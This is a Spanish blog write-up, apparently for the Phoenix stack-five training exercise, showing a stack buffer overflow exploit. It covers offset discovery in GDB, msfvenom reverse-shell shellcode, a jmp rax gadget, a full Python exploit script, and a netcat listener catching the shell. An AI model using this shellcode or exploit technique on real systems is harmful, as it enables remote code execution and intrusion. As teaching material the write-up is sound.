---
layout: single
title: "Stack Five"
permalink: /pwn/phoenix/stack-five/
parent: Phoenix
comments: true
excerpt: "Stack Five"
classes: wide
header:
  teaser: /assets/images/2025-08-17-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-17-Phoenix/banner.png)

A diferencia de ejecutar una función existente en el binario, esta vez introduciremos el concepto de "código shell", y seremos capaces de ejecutar nuestro propio código.

**Consejos:**

- No sientas que tienes que escribir tu propio shellcode todavía - hay un montón en Internet.
- Si deseas depurar tu shellcode, asegúrate de utilizar la instrucción breakpoint. En i386 / x86_64, es 0xcc, y causará un SIGTRAP.
- Asegúrate de eliminar esos puntos de interrupción cuando hayas terminado.

```csharp
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

// Incluye la biblioteca estándar de entrada/salida (printf, etc.)
#include <stdio.h>
// Incluye la biblioteca estándar de utilidades (exit, malloc, free, etc.)
#include <stdlib.h>
// Incluye funciones para manipular cadenas (strlen, strcpy, etc.)
#include <string.h>
// Incluye funciones de llamadas al sistema Unix (execve, fork, etc.)
#include <unistd.h>

// Define un texto constante llamado BANNER que mostrará el nombre del nivel
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

// Declara la función gets (obsoleta e insegura) para leer cadenas sin límite
char *gets(char *);

// Función donde se desarrolla la vulnerabilidad principal
void start_level() {
  char buffer[128];      // Reserva 128 bytes en la pila para la entrada del usuario
  gets(buffer);          // Lee una línea de entrada SIN verificar el tamaño → posible overflow
}

// Función principal
int main(int argc, char **argv) {
  printf("%s\n", BANNER); // Muestra el mensaje de bienvenida
  start_level();          // Llama a la función que tiene el buffer vulnerable
}
```

Lo primero que vamos a hacer es encontrar el offset de este binario, como ya sabemos debemos realizar un buffer, para esto vamos a utilizar la herramienta gdb y vemos las funciones con las que cuenta el main y start_level

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-five
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from stack-five...(no debugging symbols found)...done.
gef➤  info func
All defined functions:

Non-debugging symbols:
0x00000000004003c8  _init
0x00000000004003f0  gets@plt
0x0000000000400400  puts@plt
0x0000000000400410  __libc_start_main@plt
0x0000000000400420  _start
0x0000000000400436  _start_c
0x0000000000400460  deregister_tm_clones
0x0000000000400490  register_tm_clones
0x00000000004004d0  __do_global_dtors_aux
0x0000000000400560  frame_dummy
0x000000000040058d  start_level
0x00000000004005a4  main
0x00000000004005d0  __do_global_ctors_aux
0x0000000000400612  _fini
gef➤  
```

Analizamos la función `start_level` en GDB con:

```csharp
gef➤  disass start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    
End of assembler dump.
```

ahora vamos a realizar un break despues de que tome el gets 

```csharp
gef➤  b *0x00000000004005a1
Breakpoint 1 at 0x4005a1
```

ahora ejecutamos el binario con el comando `run < <(python -c 'print "A"*64')`

```csharp
gef➤  run < <(python -c 'print "A"*64')
Starting program: /opt/phoenix/amd64/stack-five < <(python -c 'print "A"*64')
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a1 in start_level ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe5a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x00007fffffffe698  →  0x00007fffffffe89e  →  "/opt/phoenix/amd64/stack-five"
$rcx   : 0x8080808080808080
$rdx   : 0x00007fffffffe5ff  →  0x007ffff7ffb3000a
$rsp   : 0x00007fffffffe5a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007fffffffe620  →  0x00007fffffffe640  →  0x0000000000000001
$rsi   : 0xfefefefefefefeff
$rdi   : 0x00007fffffffe5e1  →  0x1e00000000000000
$rip   : 0x00000000004005a1  →  <start_level+20> nop 
$r8    : 0x00007fffffffe5a0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
$r10   : 0x8080808080808080
$r11   : 0x1               
$r12   : 0x00007fffffffe6a8  →  0x00007fffffffe8bc  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x00000000004005a4  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5a0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $rax, $rsp, $r8
0x00007fffffffe5a8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffe5b0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffe5b8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffe5c0│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffe5c8│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffe5d0│+0x0030: "AAAAAAAAAAAAAAAA"
0x00007fffffffe5d8│+0x0038: "AAAAAAAA"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400594 <start_level+7>  or     BYTE PTR [rax-0x73], 0x45
     0x400598 <start_level+11> or     BYTE PTR [rax-0x77], 0xc7
     0x40059c <start_level+15> call   0x4003f0 <gets@plt>
 →   0x4005a1 <start_level+20> nop    
     0x4005a2 <start_level+21> leave  
     0x4005a3 <start_level+22> ret    
     0x4005a4 <main+0>         push   rbp
     0x4005a5 <main+1>         mov    rbp, rsp
     0x4005a8 <main+4>         sub    rsp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-five", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005a1 → start_level()
[#1] 0x4005c7 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

ahora vamos a imprimir la dirección del buffer con el comando `print $rbp-0x80`

```csharp
gef➤  print $rbp-0x80
$1 = (void *) 0x7fffffffe5a0
gef➤
```

ahora con el comando `info frame` vamos a ver el marco de pila, el **saved rip** es la **dirección de retorno** que el procesador guarda automáticamente en la pila cuando se llama a una función, con total de data que le enviamos aún no lo pisamos así que vamos a ver cual es la diferencia entre el buffer y el RIP

```csharp
gef➤   info frame
Stack level 0, frame at 0x7fffffffe630:
 rip = 0x4005a1 in start_level; saved rip = 0x4005c7
 called by frame at 0x7fffffffe650
 Arglist at 0x7fffffffe620, args: 
 Locals at 0x7fffffffe620, Previous frame's sp is 0x7fffffffe630
 Saved registers:
  rbp at 0x7fffffffe620, rip at 0x7fffffffe628
gef➤ 
```

Aunque en el código se reservaron 128 bytes para el buffer, podemos usar el comando find 0x7fffffffe5a0, +200, 0x4005c7 para ubicar en memoria la dirección de retorno (saved RIP) asociada a 0x4005c7.

En este ejemplo, buscamos a partir de la dirección de inicio del buffer (0x7fffffffe5a0) un rango de 200 bytes y localizamos el valor 0x4005c7

```csharp
gef➤  find 0x7fffffffe5a0, +200, 0x4005c7
0x7fffffffe628
1 pattern found.
gef➤ 
```

ahora lo que debemos hacer es una resta para saber el valor total del offset con el comando `printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0` y así tenemos el dato para el offset

```csharp
gef➤  printf "%i\n",0x7fffffffe628 - 0x7fffffffe5a0
136
gef➤
```

también podemos tener el offset con la herramienta pwn cyclic de la librería Pwntools, vamos a realizar este proceso desde el principio para que nos quede más claro, lo primero es correr el binario con gdb y poner el break para realizar la validación 

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ gdb -q stack-five
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from stack-five...(no debugging symbols found)...done.
gef➤  disass start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:	mov    rdi,rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave  
   0x00000000004005a3 <+22>:	ret    
End of assembler dump.
gef➤  b *0x00000000004005a1
Breakpoint 1 at 0x4005a1
gef➤
```

Luego con el comando r ejecutamos el binario y este nos pide el dato 

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

```

Generamos un **patrón único** con `pwn cyclic` (Pwntools) para provocar un crash y luego identificar el offset exacto donde se sobrescribe el **saved RIP**

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/Binarios/5_stack-five]
└─# pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

y este patrón es el que le enviamos al binario 

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Breakpoint 1, 0x00000000004005a1 in start_level ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe5a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbx   : 0x00007fffffffe698  →  0x00007fffffffe89e  →  "/opt/phoenix/amd64/stack-five"
$rcx   : 0x8080808080808080
$rdx   : 0x00007fffffffe5ff  →  "ayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabl[...]"
$rsp   : 0x00007fffffffe5a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbp   : 0x00007fffffffe620  →  "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
$rsi   : 0xfefefefefefefeff
$rdi   : 0x00007fffffffe669  →  0x0000007ffff7ff00
$rip   : 0x00000000004005a1  →  <start_level+20> nop 
$r8    : 0x00007fffffffe5a0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
$r10   : 0x8080808080808080
$r11   : 0x1               
$r12   : 0x00007fffffffe6a8  →  0x00007fffffffe8bc  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x00000000004005a4  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe5a0│+0x0000: "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"	 ← $rax, $rsp, $r8
0x00007fffffffe5a8│+0x0008: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
0x00007fffffffe5b0│+0x0010: "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa[...]"
0x00007fffffffe5b8│+0x0018: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
0x00007fffffffe5c0│+0x0020: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0x00007fffffffe5c8│+0x0028: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0x00007fffffffe5d0│+0x0030: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffe5d8│+0x0038: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400594 <start_level+7>  or     BYTE PTR [rax-0x73], 0x45
     0x400598 <start_level+11> or     BYTE PTR [rax-0x77], 0xc7
     0x40059c <start_level+15> call   0x4003f0 <gets@plt>
 →   0x4005a1 <start_level+20> nop    
     0x4005a2 <start_level+21> leave  
     0x4005a3 <start_level+22> ret    
     0x4005a4 <main+0>         push   rbp
     0x4005a5 <main+1>         mov    rbp, rsp
     0x4005a8 <main+4>         sub    rsp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "stack-five", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005a1 → start_level()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

ahora con el comando `info frame` vamos a ver la información del saved rip y vemos que ya pisamos este valor en este caso el valor quedó en saved rip = 0x6261616b6261616a

```csharp
gef➤  info frame
Stack level 0, frame at 0x7fffffffe630:
 rip = 0x4005a1 in start_level; saved rip = 0x6261616b6261616a
 called by frame at 0x7fffffffe638
 Arglist at 0x7fffffffe620, args: 
 Locals at 0x7fffffffe620, Previous frame's sp is 0x7fffffffe630
 Saved registers:
  rbp at 0x7fffffffe620, rip at 0x7fffffffe628
gef➤ 
```

Usamos `pwn cyclic -l <valor>` para localizar dentro del patrón el offset exacto que sobreescribe el **saved RIP**. En este caso, el valor `0x6261616b6261616a` que vimos en RIP durante el crash corresponde al byte número **136** de la cadena enviada, por lo que el **desplazamiento desde el inicio del buffer hasta el saved RIP** es de 136 bytes.

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/Binarios/5_stack-five]
└─# pwn cyclic -l 0x6261616b6261616a
136
```

La pila para `start_level` se organiza con 128 bytes reservados para el buffer local, seguidos de 8 bytes para el *Saved RBP* y, finalmente, 8 bytes para el *Saved RIP* (dirección de retorno). Por lo tanto, desde el inicio del buffer hasta el *Saved RIP* hay **128 + 8 = 136 bytes**, que es el valor que debemos escribir para sobreescribir la dirección de retorno.

```csharp
Direcciones (más altas)
┌─────────────────────────────┐
│ Saved RIP  ← Retorno a main │  <- $rbp + 8
├─────────────────────────────┤
│ Saved RBP                   │  <- $rbp
├─────────────────────────────┤
│                             │
│ ... espacio reservado ...   │  (0x80 bytes = 128 bytes)
│  para el buffer local       │
│                             │
├─────────────────────────────┤
│ Inicio del buffer           │  <- $rax / $rsp en gets
└─────────────────────────────┘
Direcciones (más bajas)
```

Ahora que ya tenemos el offset vamos a generar un shellcode con el comando `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode` para tener una reverse shell en la máquina 

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody/PWN/Phoenix/5_stack-five]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name shellcode
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 432 bytes
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00"
shellcode += b"\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

Una vez identificado el **offset** y generado el **shellcode**, necesitamos una forma de transferir el flujo de ejecución hacia nuestra carga maliciosa en memoria. Esto se logra utilizando una instrucción existente en el binario que salte a la dirección donde está nuestro shellcode. podemos buscar una con el comando `ROPgadget --binary stack-five --only "jmp"` y vemos que contamos con `0x0000000000400481 : jmp rax`

```csharp
user@phoenix-amd64:/opt/phoenix/amd64$ ROPgadget --binary stack-five --only "jmp"
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
```

ya con estos datos podemos crear nuestro exploit para realizar la explotación de este reto, nuestro exploit quedaría de esta manera 

```csharp
#!/usr/bin/env python3

# Total bytes hasta la dirección de retorno
offset = 136

# Shellcode de reverse shell generado con msfvenom
shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00"
shellcode += b"\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Dirección de retorno (jmp eax o dirección que apunte a tu shellcode en memoria)
ret = b"\x81\x04\x40\x00\x00\x00\x00\x00"

# Construcción del payload
payload = shellcode
payload += b"A" * (offset - len(shellcode))
payload += ret

# Imprimir a stdout para que el binario lo reciba
import sys
sys.stdout.buffer.write(payload)
```

ahora lo que necesimos hacer para ver si el exploit funciona es ejecutarlo con el binario, pero antes debemos tener dentro de la máquina una terminal a la escucha 

```csharp
user@phoenix-amd64:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Una vez estamos a la escucha, vamos a ejecutar el exploit y si todo sale bien, tendremos una shell reversa, al ejecutarlo se queda de esta manera 

```csharp
user@phoenix-amd64:/tmp$ python3 Local_exploit.py | /opt/phoenix/amd64/stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

```

Y en la otra terminal podemos ver la respuesta de Connection from 127.0.0.1 41692 received! y ya podemos ejecutar comandos 

```csharp
user@phoenix-amd64:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 127.0.0.1 41692 received!
id
uid=1000(user) gid=1000(user) euid=405(phoenix-amd64-stack-five) egid=405(phoenix-amd64-stack-five) groups=405(phoenix-amd64-stack-five),27(sudo),1000(user)

```